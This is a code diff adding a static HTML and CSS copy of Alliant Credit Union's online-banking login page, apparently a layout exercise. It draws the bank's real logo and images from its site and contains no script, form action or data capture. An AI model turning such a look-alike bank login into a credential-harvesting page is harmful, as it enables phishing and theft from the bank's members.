@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Outer parent */
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top parent holding the two children — fills the full viewport */
+        .top {
+            height: 100vh;
+            display: flex;
+        }
+
+        /* Left child */
+        .left {
+            flex: 1;
+            width: 30%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 40px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #333;
+        }
+
+        .left > * {
+            max-width: 340px;
+            width: 100%;
+        }
+
+        .logo {
+            width: 230px;
+            margin-bottom: 60px;
+        }
+
+        .secure-login {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 40px;
+        }
+
+        .secure-login .lock {
+            font-size: 22px;
+        }
+
+        .field {
+            margin-bottom: 30px;
+        }
+
+        .field-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-bottom: 8px;
+        }
+
+        .field-row label {
+            font-size: 17px;
+            color: #333;
+        }
+
+        .field-row a {
+            font-size: 14px;
+            color: #2b7a9e;
+            text-decoration: none;
+        }
+
+        .input-wrap {
+            position: relative;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 9px 14px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            outline: none;
+        }
+
+        .field input:focus {
+            border-color: #7fb3e0;
+        }
+
+        .toggle-eye {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #555;
+        }
+
+        .login-btn {
+            background: #7ba428;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            padding: 12px 75px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-bottom: 70px;
+            width: auto;
+            align-self: flex-start;
+        }
+
+        .new-user {
+            font-size: 17px;
+            color: #333;
+        }
+
+        .new-user a {
+            color: #2b7a9e;
+            text-decoration: none;
+            margin-left: 6px;
+            font-size: 15px;
+        }
+
+        /* Right child */
+        .right {
+            flex: 2;
+            width: 70%;
+            background: #00A3E0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .right img {
+            width: 70%;
+            max-width: 700px;
+        }
+
+        /* Single parent at the bottom */
+        .bottom {
+            background: #ffffff;
+            border-top: 1px solid #ddd;
+            display: flex;
+            align-items: flex-start;
+            gap: 40px;
+            padding: 18px 50px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #555;
+        }
+
+        .badges {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-shrink: 0;
+        }
+
+        .badge-housing {
+            width: 100px;
+            height: 100%;
+        }
+
+        .badge-ncua {
+            width: 180px;
+        }
+
+        .footer-content {
+            font-size: 15px;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: #2b7a9e;
+            text-decoration: none;
+            margin: 0 14px;
+        }
+
+        .footer-links a:first-child {
+            margin-left: 0;
+        }
+
+        .footer-links .sep {
+            color: #ccc;
+        }
+
+        .footer-row {
+            margin-bottom: 10px;
+        }
+
+        .footer-row a {
+            color: #2b7a9e;
+            text-decoration: none;
+            margin-right: 14px;
+        }
+
+        .footer-disclosure {
+            line-height: 1;
+            font-family: sans-serif;
+            color: #627277;
+        }
+
+        /* Mobile view */
+        @media (max-width: 768px) {
+            .top {
+                height: auto;
+                flex-direction: column;
+            }
+
+            /* Hide the blue presentation panel on mobile */
+            .right {
+                display: none;
+            }
+
+            .left {
+                width: 100%;
+                justify-content: flex-start;
+                align-items: center;
+                text-align: center;
+                padding: 50px 25px 30px;
+            }
+
+            .left > * {
+                max-width: 480px;
+            }
+
+            .logo {
+                width: 250px;
+                margin: 20px auto 50px;
+                margin-bottom: 100px;
+            }
+
+            .secure-login {
+                justify-content: center;
+                font-size: 24px;
+            }
+
+            /* Full-width button, centered */
+            .login-btn {
+                margin-top: 20px;
+                width: 60%;
+                font-size: 16px;
+                align-self: center;
+                text-align: center;
+                padding: 12px 20px;
+                white-space: nowrap;
+            }
+
+            /* Give the username/password fields a little side padding */
+            .field {
+                padding: 0 20px;
+            }
+
+            /* Stack the New to Alliant link */
+            .new-user {
+                text-align: center;
+            }
+
+            .new-user a {
+                display: block;
+                margin: 8px 0 0;
+            }
+
+            /* Footer: hide badges, center the text */
+            .bottom {
+                justify-content: center;
+                text-align: center;
+                padding: 25px;
+                border-top: none;
+            }
+
+            .badges {
+                display: none;
+            }
+
+            .footer-links a,
+            .footer-row a {
+                margin: 0 8px;
+                font-size: 12px;
+            }
+            .footer-row span {
+                font-size: 12px;
+            }
+
+            .footer-disclosure {
+                line-height: 1.4;
+                font-size: 12px;
+            }
+            .field-row label {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top">
+            <div class="left">
+                <img class="logo" src="https://www.alliantcreditunion.com/OnlineBanking/Content/alliant-logo.svg" alt="Alliant">
+
+                <div class="secure-login">
+                    <svg class="lock" viewBox="0 0 24 24" width="22" height="22" fill="#222" aria-hidden="true">
+                        <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
+                    </svg>
+                    <span>Secure Log In</span>
+                </div>
+
+                <div class="field">
+                    <div class="field-row">
+                        <label for="username">Username</label>
+                        <a href="#">Forgot Username</a>
+                    </div>
+                    <div class="input-wrap">
+                        <input type="text" id="username">
+                    </div>
+                </div>
+
+                <div class="field">
+                    <div class="field-row">
+                        <label for="password">Password</label>
+                        <a href="#">Forgot Password</a>
+                    </div>
+                    <div class="input-wrap">
+                        <input type="password" id="password">
+                        <svg class="toggle-eye" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#555" stroke-width="2" aria-hidden="true">
+                            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                            <circle cx="12" cy="12" r="3"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <button class="login-btn">Log In</button>
+
+                <div class="new-user">
+                    New to Alliant? <a href="#">Set Up Online Banking →</a>
+                </div>
+            </div>
+            <div class="right">
+                <img src="https://www.alliantcreditunion.com/OnlineBanking/Content/login-presentation.png" alt="">
+            </div>
+        </div>
+        <div class="bottom">
+            <div class="badges">
+                <img class="badge-housing" src="https://www.alliantcreditunion.com/OnlineBanking/design/equal-housing-opportunity.png" alt="Equal Housing Opportunity">
+                <img class="badge-ncua" src="https://www.alliantcreditunion.com/OnlineBanking/design/ncua.png" alt="NCUA">
+            </div>
+
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Disclosures</a><span class="sep">|</span>
+                    <a href="#">Terms</a><span class="sep">|</span>
+                    <a href="#">Privacy</a><span class="sep">|</span>
+                    <a href="#">Accessibility</a>
+                </div>
+                <div class="footer-row">
+                    <a href="#">Help Center</a><span class="sep">|</span>
+                    <span style="margin-left:14px;">ABA Routing and Transit Number #271081528</span>
+                </div>
+                <div class="footer-disclosure">
+                    Alliant Credit Union, Chicago, IL. Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States
+                    Government - National Credit Union Administration (NCUA), a U.S. Government Agency. Ver: 1.0.0.0
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
